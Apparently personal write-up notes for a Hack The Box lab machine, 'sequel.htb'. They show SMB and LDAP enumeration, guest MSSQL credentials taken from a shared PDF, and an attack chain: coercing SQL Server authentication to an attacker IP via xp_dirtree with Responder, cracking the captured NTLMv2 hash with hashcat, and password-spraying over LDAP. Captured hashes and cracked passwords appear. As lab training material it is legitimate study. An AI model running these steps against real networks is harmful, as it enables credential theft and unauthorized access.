Nmap port 389 TLS cert:
```
Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
```
=> Hostnames to add to /etc/hosts: dc.sequel.htb, sequel.htb

DNS reverse lookups for 127.0.0.1:
```bash
dnsrecon -r 127.0.0.0/24 -n 10.10.11.202   
# [*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
# [+]      PTR localhost 127.0.0.1
# [+] 1 Records Found
```

Enumeration script:
```bash
enum4linux-ng -U dc.sequel.htb

# NetBIOS computer name: DC
# NetBIOS domain name: sequel
# DNS domain: sequel.htb
# FQDN: dc.sequel.htb

# [+] Domain: sequel
# [+] Domain SID: S-1-5-21-4078382237-1492182817-2568127209
```

```bash
smbclient -N -L \\\\dc.sequel.htb\\
# Public

smbclient -N \\\\dc.sequel.htb\\Public
# SQL Server Procedures.pdf
```

`SQL Server Procedures.pdf`
```
=> Usernames: Ryan, Tom, Brandon
=> Brandon admin?
brandon.brown@sequel.htb

Guest creds:
user: PublicUser
password: GuestUserCantWrite1
```

ASPReproasting:
```bash
impacket-GetNPUsers -dc-host dc.sequel.htb -no-pass -usersfile users.txt sequel.htb/

# [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
# [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
# [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Connect to DB as public user:
```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@dc.sequel.htb
```

List stored procedures:
```
SELECT name, type FROM dbo.sysobjects WHERE (type = 'P') AND LEFT(ROUTINE_NAME, 3) NOT IN ('sp_', 'xp_', 'ms_');
```
=> none

```
cmdkey /add:"dc.sequel.htb" /user:"sequel\haxxor" /pass:haxxor
```
DUNNO...

# Official solution from here

Run responder:
```bash
sudo responder -I tun0 -v
```

In the DB run:
```
EXEC MASTER.sys.xp_dirtree '\\10.10.14.58\test', 1, 1
```

Responder captures a NTLMv2 hash:
```
sql_svc::sequel:f5e299ec2583d708:E2A66540A623B8A2F556E2BE664B4E68:010100000000000000C98F933BCDDB013871FB61244A6FC90000000002000800350043004E00590001001E00570049004E002D0048004E005400350047005A005A00360055004E00590004003400570049004E002D0048004E005400350047005A005A00360055004E0059002E00350043004E0059002E004C004F00430041004C0003001400350043004E0059002E004C004F00430041004C0005001400350043004E0059002E004C004F00430041004C000700080000C98F933BCDDB0106000400020000000800300030000000000000000000000000300000AC3C69451BC47EEE512C2FF68F82FAFCE7FA7DBC49CF92FD072881E4A998B3B20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350038000000000000000000
```

Crack hash:
```bash
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```
=> REGGIE1234ronnie

LDAP pw spray:
```bash
netexec ldap 10.10.11.202 -u users.txt -p REGGIE1234ronnie --continue-on-success
```
=> `sequel.htb\Brandon:REGGIE1234ronnie`

